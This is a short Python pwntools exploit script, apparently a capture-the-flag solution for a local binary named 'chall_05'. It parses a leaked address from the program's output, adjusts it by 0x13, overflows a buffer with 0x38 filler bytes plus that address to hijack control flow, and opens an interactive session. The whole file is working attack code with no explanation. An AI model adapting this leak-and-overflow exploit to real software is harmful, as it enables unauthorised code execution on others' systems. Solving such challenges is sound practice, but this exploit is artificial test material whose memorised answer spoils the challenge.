from pwn import *
import re
p=process("./chall_05")
p.recv()
p.sendline()
resp = p.recv()
leak = int(re.findall(b"([a-f0-9]{8,16})",resp)[0],16)
leak -= int(b"0x13",16)
p.sendline((0x40-0x8)*b"A"+p64(leak))
p.interactive()
